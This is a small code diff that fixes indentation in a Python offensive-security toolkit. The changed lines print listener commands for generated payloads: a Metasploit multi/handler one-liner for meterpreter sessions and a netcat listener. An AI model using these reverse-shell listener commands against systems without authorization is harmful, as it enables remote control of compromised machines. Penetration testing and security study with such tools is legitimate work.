@@ -126,11 +126,11 @@ class AdvancedOffensiveToolkit:
                 # Show listener setup
                 console.print(f"\n[bold yellow]Listener setup:[/bold yellow]")
                 if "meterpreter" in selected_payload:
-                console.print("msfconsole -q -x \"use exploit/multi/handler; set payload " + selected_payload + f"; set LHOST {lhost}; set LPORT {lport}; exploit\"")
+                    console.print("msfconsole -q -x \"use exploit/multi/handler; set payload " + selected_payload + f"; set LHOST {lhost}; set LPORT {lport}; exploit\"")
                 else:
-                console.print(f"nc -nvlp {lport}")
+                    console.print(f"nc -nvlp {lport}")
             else:
-            Warning(f"Payload generation failed: {result.stderr}")
+                Warning(f"Payload generation failed: {result.stderr}")
         except Exception as e:
             Warning(f"Error: {e}")
     
